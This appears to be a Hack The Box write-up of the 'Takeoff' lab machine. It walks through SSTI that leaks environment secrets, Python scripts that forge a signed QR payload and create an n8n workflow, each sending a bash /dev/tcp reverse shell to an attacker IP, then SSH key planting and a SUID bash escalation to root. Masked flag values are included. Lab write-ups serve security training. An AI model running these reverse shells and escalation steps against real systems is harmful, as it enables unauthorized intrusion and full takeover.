# Hack The Box --- Takeoff

> A technical walkthrough of the **Takeoff** machine on Hack The Box.

  Property               Value
  ---------------------- -----------------
  **Machine**            Takeoff
  **Difficulty**         Hard
  **Operating System**   Linux
  **Author**             Iskandarov Fayozbek
  **Writeup**            Secfz Hunter

------------------------------------------------------------------------

## Table of Contents

1.  [Reconnaissance](#1-reconnaissance)
2.  [Initial Access --- SSTI and Remote Code
    Execution](#2-initial-access--ssti-and-remote-code-execution)
3.  [Privilege Escalation --- www-data to Root Inside the
    Container](#3-privilege-escalation--www-data-to-root-inside-the-container)
4.  [Container Breakout --- Root Container to
    kpark](#4-container-breakout--root-container-to-kpark)
5.  [Privilege Escalation --- kpark to Host
    Root](#5-privilege-escalation--kpark-to-host-root)
6.  [Flags](#6-flags)

------------------------------------------------------------------------

## 1. Reconnaissance

### 1.1. Nmap Scan

The first step is to enumerate the target and identify its exposed ports
and running services.

``` bash
nmap -sC -sV -oN nmap/initial 10.129.25.25
```

The scan identifies the following services:

  Port       Service
  ---------- -----------------
  `22/tcp`   SSH --- OpenSSH
  `80/tcp`   HTTP --- Nginx

Add the target hostname to the local hosts file:

``` bash
echo "10.129.25.25 takeoff.htb" | sudo tee -a /etc/hosts
```

### 1.2. Web Enumeration

Browse to `http://takeoff.htb`. The website presents an HTB Airways
booking application.

The application is built with Go using the Echo framework, with HTMX
used on the frontend. Directory enumeration can be used to discover
additional paths. For this machine, the booking workflow and
authentication functionality are particularly relevant.

------------------------------------------------------------------------

## 2. Initial Access --- SSTI and Remote Code Execution

### 2.1. Account Creation and JWT Analysis

Register an account on the website and log in. The application issues a
JWT as the session cookie.

Decoding the token reveals that it uses the `HS256` signing algorithm.
However, the signing secret is not initially known.

### 2.2. Identifying Server-Side Template Injection

Continue through the booking process and obtain a Passenger Name Record
(PNR):

``` text
PS2RQV
```

In the **Tickets** section, the application provides a **Notes** field
that accepts user-supplied text.

Submit the following template expression:

``` text
{{7*7}}
```

Download the boarding pass as a PDF and inspect its contents. The PDF
contains the evaluated result:

``` text
49
```

This confirms that user-controlled input is being evaluated by a
server-side template engine, indicating a Server-Side Template Injection
(SSTI) vulnerability.

### 2.3. Leaking Environment Variables

The template functionality can also be used to attempt to read the
current process environment through `/proc/self/environ`.

Submit the following request:

``` bash
curl -s -X POST http://takeoff.htb/tickets/PS2RQV/notes \
  -H "Cookie: session_token=<YOUR_JWT>" \
  -d 'notes={{.File "/proc/self/environ"}}' \
  -o /dev/null
```

Download the generated boarding pass:

``` bash
curl -s http://takeoff.htb/tickets/PS2RQV/download \
  -H "Cookie: session_token=<YOUR_JWT>" \
  -o leak.pdf
```

Search the PDF for relevant environment variables:

``` bash
strings leak.pdf | grep -E "TOKEN|KEY"
```

The supplied notes identify the following values:

``` text
TICKET_VALIDATION_TOKEN:
JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR

N8N_API_KEY:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Important:** The `N8N_API_KEY` value above is truncated in the source
material. The complete value must be recovered from the target during
the lab; do not treat the abbreviated value as a usable API key.

### 2.4. QR Code Manipulation and Command Execution

The boarding pass QR code contains serialized data. According to the
observed application behavior, the data is authenticated using the
`TICKET_VALIDATION_TOKEN`.

The decoded QR content has the following general structure:

``` json
{
  "PNR": "PS2RQV",
  "Token": "...",
  "Seat": "11A",
  "Passenger": "Caroline Hunter",
  "NotifyCmd": "check-in-notify --pnr PS2RQV --email test@htb.local"
}
```

The `NotifyCmd` field is significant because it is used by the check-in
notification functionality. The supplied exploitation approach modifies
this field and recalculates the HMAC-SHA256 signature using the
recovered validation token.

#### Python Exploit Script

The following script represents the workflow described in the original
notes: decode the QR data, locate and replace the JSON payload,
calculate a new HMAC-SHA256 signature, and submit the modified data to
the check-in API.

``` python
import base64
import hmac
import hashlib
import json
import re
import requests

KEY = b"JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR"
QR_B64 = "<ORIGINAL_QR_BASE64>"

LHOST = "10.10.14.25"
LPORT = "9001"

raw = base64.b64decode(QR_B64)
json_match = re.search(rb'\{"PNR".*?\}', raw)
original_json = json_match.group(0)

cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

prefix = (
    b'{"PNR":"PS2RQV","Token":"72f6db8e7a4f35283493f058224af234",'
    b'"Seat":"11A","Passenger":"Caroline Hunter","NotifyCmd":"'
)
suffix = b'"}'

room = len(original_json) - len(prefix) - len(suffix)
padded_cmd = cmd + " " * (room - len(cmd))
new_json = prefix + padded_cmd.encode() + suffix

body = bytearray(raw)
start, end = json_match.span()
body[start:end] = new_json

data_to_sign = bytes(body[:-32])
signature = hmac.new(KEY, data_to_sign, hashlib.sha256).digest()
body[-32:] = signature

final_b64 = base64.b64encode(bytes(body)).decode()

# Submit the modified QR data to the check-in API.
requests.post(
    "http://takeoff.htb/api/check-in",
    data={"qr_data": final_b64, "gate": "WEB"},
    headers={"Cookie": "session_token=<YOUR_JWT>"}
)
```

Start a listener on the matching port:

``` bash
nc -lvnp 9001
```

After the script is executed and the check-in request is processed, the
described result is a shell running as the `www-data` user.

------------------------------------------------------------------------

## 3. Privilege Escalation --- www-data to Root Inside the Container

### 3.1. Service Enumeration

After obtaining the `www-data` shell, enumerate running processes and
service configuration.

Check for the n8n process:

``` bash
ps aux | grep n8n
```

Inspect the relevant systemd service:

``` bash
systemctl cat htb-air
```

The `htb-air.service` configuration contains the `N8N_API_KEY`
environment variable. This key provides access to the n8n API.

### 3.2. n8n Workflow Abuse

The next stage uses the n8n API to create and activate a workflow. The
workflow described in the source consists of three nodes:

1.  **Webhook** --- receives an HTTP request.
2.  **Execute Command** --- runs the configured command.
3.  **Respond to Webhook** --- returns the webhook response.

The workflow is then activated and triggered through its webhook
endpoint.

### 3.3. Python Workflow Script

``` python
import requests
import json

API_KEY = "<FOUND_N8N_API_KEY>"
TARGET = "http://127.0.0.1:5678/api/v1"

HEADERS = {
    "X-N8N-API-KEY": API_KEY,
    "Content-Type": "application/json"
}

LHOST = "10.10.14.25"
LPORT = "9002"

wf = {
    "name": "root_pwn",
    "nodes": [
        {
            "parameters": {
                "httpMethod": "GET",
                "path": "pwn",
                "responseMode": "responseNode"
            },
            "id": "webhook-1",
            "name": "Webhook",
            "type": "n8n-nodes-base.webhook",
            "typeVersion": 2,
            "position": [240, 300],
            "webhookId": "pwn-uuid-001"
        },
        {
            "parameters": {
                "command": f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
            },
            "id": "exec-1",
            "name": "Execute Command",
            "type": "n8n-nodes-base.executeCommand",
            "typeVersion": 1,
            "position": [460, 300]
        },
        {
            "parameters": {},
            "id": "respond-1",
            "name": "Respond to Webhook",
            "type": "n8n-nodes-base.respondToWebhook",
            "typeVersion": 1,
            "position": [680, 300]
        }
    ],
    "connections": {
        "Webhook": {
            "main": [[
                {
                    "node": "Execute Command",
                    "type": "main",
                    "index": 0
                }
            ]]
        },
        "Execute Command": {
            "main": [[
                {
                    "node": "Respond to Webhook",
                    "type": "main",
                    "index": 0
                }
            ]]
        }
    },
    "settings": {
        "executionOrder": "v1"
    }
}

r = requests.post(
    f"{TARGET}/workflows",
    json=wf,
    headers=HEADERS
)

wf_id = r.json()["id"]

requests.post(
    f"{TARGET}/workflows/{wf_id}/activate",
    headers=HEADERS
)

requests.get("http://127.0.0.1:5678/webhook/pwn")
```

Start a listener:

``` bash
nc -lvnp 9002
```

When the workflow is triggered, the described result is a root shell
inside the n8n container.

------------------------------------------------------------------------

## 4. Container Breakout --- Root Container to kpark

The next stage takes advantage of a filesystem mount between the n8n
container and the host.

According to the observed configuration, the container's `/root`
directory is mounted to `/home/kpark` on the host. This means that files
created under the relevant container path are also accessible through
the corresponding host path.

### 4.1. Generate an SSH Key Pair

Generate an Ed25519 key pair on the attacking machine:

``` bash
ssh-keygen -t ed25519 -f kpark_key -N ""
```

This creates:

-   `kpark_key` --- the private key.
-   `kpark_key.pub` --- the public key.

### 4.2. Place the Public Key in authorized_keys

The supplied approach uses the n8n workflow to place the public key in
the container path corresponding to the host user's SSH configuration:

``` text
/root/.ssh/authorized_keys
```

The relevant values and command from the original notes are:

``` python
PUBKEY = "<YOUR_PUBLIC_KEY>"

CMD = (
    f"mkdir -p /root/.ssh && "
    f"echo '{PUBKEY}' >> /root/.ssh/authorized_keys && "
    f"chmod 700 /root/.ssh && "
    f"chmod 600 /root/.ssh/authorized_keys && "
    f"chown -R 1001:1001 /root/.ssh"
)

# ... workflow update code similar to the previous section ...
```

### 4.3. Connect as kpark

Connect to the host using the generated private key:

``` bash
ssh -i kpark_key kpark@takeoff.htb
```

Once connected, retrieve the user flag:

``` bash
cat /home/kpark/user.txt
```

At this point, access to the host as `kpark` has been obtained.

------------------------------------------------------------------------

## 5. Privilege Escalation --- kpark to Host Root

The final privilege-escalation stage uses the mounted filesystem and the
absence of the `nosuid` mount option on the relevant host filesystem.

The approach described in the original notes is to create a Bash copy in
`/home/kpark` and then use the container-side workflow to change its
ownership and set its SUID permission bit.

### 5.1. Create a Bash Copy

From the `kpark` shell, copy Bash into the home directory:

``` bash
cp /bin/bash /home/kpark/hb
```

### 5.2. Set Ownership and SUID Permissions

Use the n8n workflow to run the following command against the
corresponding container path:

``` python
CMD = "chown root:root /root/hb && chmod 4755 /root/hb"

# ... workflow update code ...
```

The command changes the file owner to root and sets the SUID bit.

### 5.3. Obtain a Root Shell

Return to the `kpark` shell and execute the SUID-enabled Bash copy:

``` bash
/home/kpark/hb -p
```

Verify the current identity:

``` bash
id
```

Finally, read the root flag:

``` bash
cat /root/root.txt
```

This completes the privilege-escalation chain described for the machine.

------------------------------------------------------------------------

## 6. Flags

### User Flag

``` text
e4d7ab5cb0e9c20ee0f34081xxxxxxxx
```

### Root Flag

``` text
80f1d8c1e6d70265a5a63d31bxxxxxxx
```

> **Flag note:** The values above are intentionally shown exactly as
> provided in the source notes, including the masked characters. Replace
> them with your actual values if you intend to keep a private copy.
> Consider leaving flags redacted in a public repository.

------------------------------------------------------------------------

## Key Takeaways

The Takeoff walkthrough demonstrates a multi-stage compromise chain
involving several application and infrastructure components:

-   **SSTI:** User-controlled ticket notes are evaluated by the
    server-side template engine.
-   **Sensitive information disclosure:** The template behavior is used
    to access process environment data.
-   **Application logic and command execution:** The boarding-pass QR
    workflow and its signature validation are central to the
    initial-access path described here.
-   **n8n API exposure:** An API key found in service configuration
    provides access to workflow functionality.
-   **Container-to-host filesystem exposure:** A mount maps a container
    directory to the host user's home directory.
-   **SUID misconfiguration:** The final stage uses SUID permissions on
    a file located in the mounted host directory.

------------------------------------------------------------------------

## Credits

**Writeup by Secfz Hunter**

**Platform:** Hack The Box\
**Machine:** Takeoff\
**Difficulty:** Hard\
**Operating System:** Linux

------------------------------------------------------------------------

## Publication Checklist

Before publishing this writeup to a public GitHub repository:

-   Replace placeholders such as `<YOUR_JWT>`, `<ORIGINAL_QR_BASE64>`,
    `<FOUND_N8N_API_KEY>`, and `<YOUR_PUBLIC_KEY>` only in a private
    working copy where appropriate.
-   Do not publish real JWTs, API keys, private SSH keys, or other
    credentials.
-   The `N8N_API_KEY` shown in these notes is truncated and is not a
    complete credential.
-   Keep flags redacted if you do not want to disclose the machine's
    answers.
-   Verify all commands, paths, API behavior, and outputs against your
    own lab session before presenting the writeup as independently
    reproduced.
